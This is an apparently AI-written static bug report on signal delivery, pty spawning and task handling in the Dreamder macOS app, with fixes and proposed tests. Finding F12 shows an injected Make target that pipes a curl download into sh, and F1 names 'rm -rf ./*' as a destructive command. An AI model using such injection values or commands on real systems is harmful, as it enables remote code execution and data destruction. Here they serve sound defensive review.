# bugs-process-terminal.md

Scope: `Utils/Process`, `Utils/ShellClient`, `Features/Tasks`, `Features/TerminalEmulator`, `Features/UtilityArea` (paths below are relative to `dreamder/`). Nothing was built or run.

- Line numbers for files read raw were counted by hand and matched grep anchors where available; `≈` marks lines counted without an anchor.
- URLs marked † were cited from knowledge and not fetched in this run. The Apple bash sources (`jobs.c`, `trap.c`, `execute_cmd.c`) were fetched.

## 1. CI failure: `interruptSendsSigintToARunningTask(.bash)`, 120 s limit, macOS 27

**Verdict: test bug.** The product delivers SIGINT to bash correctly on paper. The specific trigger on that runner is not provable statically [INFERENCE]; the test turns any anomaly into an undiagnosable time-limit hit.

### Why the product path is correct

- **The shell pid is signalled directly, independent of process groups.** `Dreamder/Features/TerminalEmulator/Model/ProcessTree.swift:34-41`:
  ```swift
  let tree = [root] + descendants(of: root)
  for pid in ordered { kill(pid, signal) }
  if getpgid(root) == root { killpg(root, signal) }
  ```
- **Task shells are always interactive.** `CEActiveTaskTerminalView.swift:55` uses `["-lic"]`; line 65 uses the integration args (`-il`) plus `-c`. For bash this turns job control on: Apple `bash-3.2/jobs.c:3513-3516` sets `job_control = 0` only `if (interactive == 0)`, and `:3569` sets `job_control = 1`.
- **With job control, bash keeps its normal SIGINT handler while waiting.** `jobs.c:2332` installs `wait_sigint_handler` only `if (job_control == 0 || …)`. The "child must also die of SIGINT" paths (`jobs.c:3213`, `:3236-3237`) therefore do not apply.
- **The trap runs at the next command boundary.** `execute_cmd.c:514-515` is `QUIT; run_pending_traps ();`. That is at most one `sleep 0.1` later. The bash manual says the same: a trap is not executed until the foreground command completes (https://www.gnu.org/software/bash/manual/html_node/Signals.html †).
- **`sleep` is reached too, when it is in the snapshot.** It runs in its own process group and is found through `proc_listpids`. Missing it between iterations is harmless.

Source: https://github.com/apple-oss-distributions/bash/blob/main/bash-3.2/jobs.c. That `/bin/bash` on the macOS 27 runner is this code base is [INFERENCE].

The two disabled legacy tests (`DreamderTests/Features/Tasks/TaskManagerTests.swift:87,113`, "never receive signals") predate `ProcessTree`. Signalling only an interactive shell does nothing visible: bash ignores SIGTERM when interactive and defers traps. They are stale.

### Why the test produces exactly this symptom

`DreamderTests/Features/Tasks/CEActiveTaskCoverageTests.swift:173-178` chains three waits:

```swift
try await fixture.waitUntilReady(output)
activeTask.interrupt()
try await eventually { activeTask.status == .finished }
try await fixture.waitForOutput(output, containing: TasksCoverageFixture.interruptMarker)
```

1. **A failed wait does not stop the test.** `DreamderTests/Utils/eventually.swift:6,15` defaults to 90 s and ends in a non-throwing `#expect(condition())`. Three such waits can take 270 s against a 120 s limit (`AGENTS.md` rule 15). One timed-out wait plus 30 s of anything else is reported as a time limit on the `@Test` line (168).
2. **`status == .finished` cannot tell "interrupted" from "ran to completion".** The loop in `TasksCoverageFixture.swift:8-13` ends by itself after 600 × 0.1 s ≥ 60 s with exit 0, and `CEActiveTask.swift:70-75` maps 0 to `.finished`. If the INT has no effect, line 177 passes at T_ready + 60 s or later, line 178 waits for a marker that never comes, and the 120 s limit always fires first, with no failed expectation in the log.
3. **The marker is asserted as terminal text written right before `exit 0`** (`TasksCoverageFixture.swift:10`). `NEXT_STEPS.md:16` already records this pattern as flaky and says such tests should assert a file side effect.
4. **bash startup is not hermetic.** The fixture isolates only zsh through `ZDOTDIR` (`TasksCoverageFixture.swift:21-28,39-45`). `bash -l` reads `/etc/profile` and the runner user's `~/.bash_profile` (https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html †). That time counts against the limit.

### Candidate triggers, all [INFERENCE]

Each is distinguishable from the existing log by which expectation failed before the time limit.

| Log shows | Meaning |
|---|---|
| Only the time limit | INT had no effect and the loop ran to completion. The only code path I found is an inherited blocked SIGINT mask (finding F10). |
| Failure at line 177 | The shell exited non-zero or by signal, for example a trap that was never installed because SIGINT was ignored on entry (`trap.c:116-122`, `:486-488`). |
| Failure at line 178 | The marker was lost (item 3), with T_ready above 30 s. |
| Failure at fixture line 52 | Slow bash startup or a main-thread stall (`AGENTS.md` rule 12). |

I found no code in `Dreamder/` that ignores or blocks signals (grep for `SIG_IGN|sigprocmask|pthread_sigmask|sigaction` returned nothing). Both matrix jobs launch tests the same way (`make coverage`, workflow line 91).

### Smallest correct fix (test side)

1. In `eventually.swift:15` and `:29`, use `try #require(…)` so the first timed-out wait ends the test at its own line.
2. In the signal tests, pass explicit timeouts that sum below 120 s (for example 30/20/20).
3. In `TasksCoverageFixture.signalLoopCommand`, append `; exit 7` after the loop so natural completion is `.failed`. Have the traps write the marker to a file and assert the file.
4. In `makeTask`, add `HOME=<temp dir>` next to `ZDOTDIR` so bash reads no user profile.

No product change is needed for delivery. F5 and F10 are adjacent product defects.

## 2. Findings

### F1 · P0 · Task runs in the app's working directory when its own directory is missing
- **Where:** `Dreamder/Features/TerminalEmulator/Views/CEActiveTaskTerminalView.swift:78`; SwiftTerm `Pty.swift:77-81`.
- **Quote:**
  ```swift
  currentDirectory: URL(filePath: activeTask.task.workingDirectory, relativeTo: url).absolutePath
  // SwiftTerm:
  _ = currentDirectory.withCString { p in chdir(p) }
  ```
- **Sequence:** a saved or discovered task points at a subfolder; the folder is renamed or removed by a branch switch; Run. `chdir` fails, the result is discarded, and `execve` proceeds in the inherited directory. For a launchd-started app that is `/` [INFERENCE]. `rm -rf ./*` or `git clean -fdx` then runs there.
- **Standard:** chdir(2) returns -1 on error and must be checked (`man 2 chdir`; https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/chdir.2.html †).
- **Fix:** before `process.startProcess`, check the directory exists; otherwise print an error and set `.failed`.
- **Confidence:** high. Grep for `fileExists|isExecutableFile` in `TerminalEmulator/Views` and `Tasks/Models` found no validation.
- **Test:** a task with `workingDirectory: "gone"` and command `pwd > "$OUT"`; today the file contains the host's directory.

### F2 · P1 · Unsupported login shell leaves the task `.running` forever with no process
- **Where:** `Dreamder/Features/Tasks/Models/CEActiveTask.swift:53-56`; `CEActiveTaskTerminalView.swift:45-47`; `CELocalShellTerminalView.swift:169-172`; default `Settings/Pages/TerminalSettings/Models/TerminalSettings.swift:40` (`shell = .system`).
- **Quote:**
  ```swift
  updateTaskStatus(to: .running)
  view.startProcess(workspaceURL: workspaceURL, shell: shell)
  // view:
  guard let (shell, shellPath) = getShell(shell, userSetting: terminalSettings.shell) else { return }
  ```
- **Sequence:** login shell is fish, nu or tcsh, so `Shell(rawValue:)` is nil and `startProcess` returns silently. Status stays `.running`, the "Running…" notification is never deleted, `runningPID()` is nil so Stop does nothing, and a re-run waits 5 s + 5 s. The same applies when `forkpty` fails. Terminal tabs stay blank with no message (`CELocalShellTerminalView.swift:129-131`).
- **Standard:** forkpty(3) and execve(2) can fail and callers must handle it (`man 3 forkpty` †).
- **Fix:** fall back to `/bin/zsh` for unsupported shells, or return success from `startProcess` and set `.failed` with a message.
- **Confidence:** high. `ActiveTaskTerminalViewCoverageTests.startingWithAnUnsupportedSystemShellWritesNothing` pins the silent view; no test checks the task status.
- **Test:** `systemShell = { "/opt/homebrew/bin/fish" }`, call `activeTask.run`, expect status not `.running`.

### F3 · P1 · Stop (SIGTERM) on a bash task kills the current command and bash runs the next one
- **Where:** `CEActiveTask.swift:127-131`; `TaskManager.swift:≈234-238`; `TaskManager.swift:296-299`.
- **Quote:**
  ```swift
  func terminate() {
      guard let shellPID = output?.runningPID() else { return }
      ProcessTree.send(SIGTERM, to: shellPID)
      resume()
  }
  ```
- **Sequence:** bash task `make build; ./deploy.sh`, started with `-i`. Stop kills `make`; interactive bash ignores SIGTERM and continues with `./deploy.sh`. It exits 0 and the UI says "Finished running". `deleteTask` sends the same single SIGTERM and drops the handle, so a TERM-ignoring task is orphaned. Only `terminateAndWait` escalates. zsh behaviour was not verified.
- **Standard:** "When Bash is interactive, in the absence of any traps, it ignores SIGTERM" (https://www.gnu.org/software/bash/manual/html_node/Signals.html †).
- **Fix:** Stop and delete go through the HUP → TERM → KILL escalation that `terminateSession()` and `terminateAndWait()` already implement.
- **Confidence:** high for bash. `terminateAsksARunningTaskToExit(.bash)` uses an explicit TERM trap and does not cover the default.
- **Test:** bash task `sleep 600; echo continued > "$F"`; terminate; expect the file never appears.

### F4 · P1 · Raw `waitpid` status is decoded as an exit code
- **Where:** `CEActiveTask.swift:63-67,81`; `TerminalEmulatorView+Coordinator.swift:39`; SwiftTerm `LocalProcess.swift:≈175-177`.
- **Quote:**
  ```swift
  // Shells add 128 to non-zero exit codes.
  if terminationStatus > 128 { terminationStatus -= 128 }
  ...
  case 2, 9, 15: // SIGINT or SIGTERM
  // SwiftTerm: waitpid (shellPid, &n, WNOHANG); delegate?.processTerminated(self, exitCode: n)
  ```
- **Sequence:** a shell exits 130 after an interrupt. The raw status is `130 << 8 = 33280`, minus 128 falls to `default`, and the task shows "Failed to run" instead of cancelled. The terminal tab prints "Exit code: 768" for `exit 3`. `terminationStatusMapsToTheTaskStatus` asserts 130 → `.notRunning`, a value production can never receive for an exit.
- **Standard:** status must be decoded with `WIFEXITED`/`WEXITSTATUS`/`WIFSIGNALED`/`WTERMSIG` (`man 2 wait`; https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/waitpid.2.html †).
- **Fix:** decode once in `CEActiveTaskTerminalView.processTerminated` (signal = `s & 0x7f`, code = `(s >> 8) & 0xff`), then map code 128+n and signals.
- **Confidence:** high.
- **Test:** real zsh task `exit 130`, expect `.notRunning`.

### F5 · P1 · Every signal is delivered twice to the root and its group
- **Where:** `ProcessTree.swift:36-41` (quote in section 1).
- **Sequence:** a `forkpty` child is always its own group leader, so the root gets `kill` and then `killpg`. For a task whose shell exec'd the tool, Stop equals a double Ctrl-C, which tools with graceful-then-force handling treat as force quit [INFERENCE about specific tools].
- **Standard:** kill(2) and killpg(2) each deliver the signal (`man 2 kill`, `man 2 killpg` †).
- **Fix:** if root leads its group, use `killpg` for the group and `kill` only for descendants whose pgid differs.
- **Confidence:** high on the code; medium on impact.
- **Test:** a `python3` helper that counts SIGINT deliveries, exec'd as the task.

### F6 · P1 · Failed `execve` leaves a forked copy of the app running
- **Where:** SwiftTerm `Pty.swift:76-89`; trigger `CELocalShellTerminalView.swift:170-172`.
- **Quote:**
  ```swift
  if pid == 0 {
      ...
      let _ = execve(andExec, pargs, penv)
  }
  return (pid, master)
  ```
- **Sequence:** the login shell path no longer exists (for example a removed `/opt/homebrew/bin/bash`). `execve` fails and the child returns `(0, master)` into app code. A second Dreamder process continues on a forked main thread.
- **Standard:** after fork in a multithreaded process only async-signal-safe calls until exec (`man 2 fork` †).
- **Fix (app side):** check `FileManager.isExecutableFile(atPath:)` before `startProcess`. Proper fix is `posix_spawn` in a package fork.
- **Confidence:** high on the code; narrow trigger.
- **Test:** `systemShell = { "/nonexistent/zsh" }` must not start a process.

### F7 · P2 · `LocalProcessPump.pending` is unbounded
- **Where:** `Dreamder/Features/TerminalEmulator/Views/LocalProcessPump.swift:42-50`.
- **Quote:**
  ```swift
  let wasEmpty = pending.withLock { events in
      events.append(event)
      return events.count == 1
  }
  ```
- **Sequence:** SwiftTerm paces reads through `dispatchQueue.sync { dataReceived }` (`LocalProcess.swift:≈165-167`). The pump returns at once, so while the main actor is blocked or slower than a chatty task, every chunk accumulates.
- **Standard:** not documented in official sources as a rule; the relevant contract is `DispatchIO` high-water pacing (https://developer.apple.com/documentation/dispatch/dispatchio †).
- **Fix:** cap pending bytes and block the private pump queue until drained.
- **Confidence:** medium.
- **Test:** append without draining and expect back-pressure.

### F8 · P2 · `ProcessSlotPool.acquire` can lose a cancellation
- **Where:** `Dreamder/Utils/Process/ProcessSlotPool.swift:38-57`.
- **Quote:**
  ```swift
  try Task.checkCancellation()
  try await withCheckedThrowingContinuation { continuation in
      let granted = state.withLock { ... state.waiters.append(Waiter(id: id, continuation: continuation)); return false }
  ```
- **Sequence:** cancellation lands after `checkCancellation` and before the append. `onCancel` finds no waiter, the waiter is then queued and stays until a slot frees. With all slots held by invocations without a timeout, the cancelled caller never returns.
- **Standard:** the cancellation handler runs immediately and concurrently with the operation (https://developer.apple.com/documentation/swift/withtaskcancellationhandler(operation:oncancel:isolation:) †).
- **Fix:** check `Task.isCancelled` inside the lock before appending and resume throwing.
- **Confidence:** high on the race.
- **Test:** pool of 1, hold the slot, cancel between check and append through a seam.

### F9 · P2 · Concurrent `runTask` calls for one task are not serialized
- **Where:** `TaskManager.swift:≈176-187`.
- **Quote:**
  ```swift
  if let activeTask = activeTasks[task.id] {
      await activeTask.terminateAndWait()
      activeTask.run(workspaceURL: workspaceURL)
  ```
- **Sequence:** two re-run requests while the task runs; both await. Call A restarts. Call B then either calls `run()` on the live process (new `activeTaskID`, first "Running…" notification never deleted) or times out and SIGKILLs A's new run.
- **Standard:** actor reentrancy across `await` (https://docs.swift.org/swift-book/documentation/the-swift-programming-language/concurrency/ †).
- **Fix:** keep one in-flight restart `Task` per task id.
- **Confidence:** medium.
- **Test:** two overlapping `runTask` calls, expect exactly one process start.

### F10 · P2 · Task shells inherit the app's signal mask and ignored dispositions
- **Where:** SwiftTerm `Pty.swift:72-87` (no `sigprocmask` or `signal` reset between `forkpty` and `execve`); called from `CEActiveTaskTerminalView.swift:73`.
- **Sequence:** if the host has SIGINT blocked or ignored, bash keeps the mask and cannot trap an ignored signal (`trap.c:116-122,486-488`). Interrupt then has no effect.
- **Standard:** execve(2) preserves ignored signals and the mask (`man 2 execve` †); `POSIX_SPAWN_SETSIGDEF`/`SETSIGMASK` exist for this (`man 3 posix_spawnattr_setflags` †).
- **Fix:** own the spawn with `posix_spawn`.
- **Confidence:** medium.
- **Test:** block SIGINT on the calling thread, start the signal task, expect the trap to fire.

### F11 · P2 · `ProcessTree.send` signals a snapshot
- **Where:** `ProcessTree.swift:34-38`.
- **Sequence:** a process forked between `descendants()` and its parent's `kill` is not in the list. Under an interactive shell it is in another group, so it survives as an orphan.
- **Standard:** not documented in official sources as a rule.
- **Fix:** SIGSTOP top-down, re-enumerate to a fixed point, signal, then SIGCONT.
- **Confidence:** medium.
- **Test:** inject the enumerator and return a late child.

### F12 · P2 · Make targets are interpolated into a shell command unquoted
- **Where:** `Dreamder/Features/Tasks/Discovery/MakeTaskDiscovery.swift:6,17`.
- **Quote:**
  ```swift
  private static let forbiddenTargetCharacters = CharacterSet(charactersIn: "%$=/")
  entries: targets.map { TaskEntry(command: "make \($0)") }
  ```
- **Sequence:** `.PHONY: x;{curl,-sL,host}|sh` yields the command `make x;{curl,-sL,host}|sh`. Impact is limited: the name shows it and a Makefile already runs arbitrary code after the trust prompt. It violates `AGENTS.md` rule 10; npm uses `shellWord`.
- **Fix:** quote with the same `shellWord`.
- **Confidence:** high.
- **Test:** a Makefile with that target, expect a quoted command.

Dropped as speculative: an endless `drainUntilEndOfOutput`, because it depends on undocumented pty EOF behaviour.
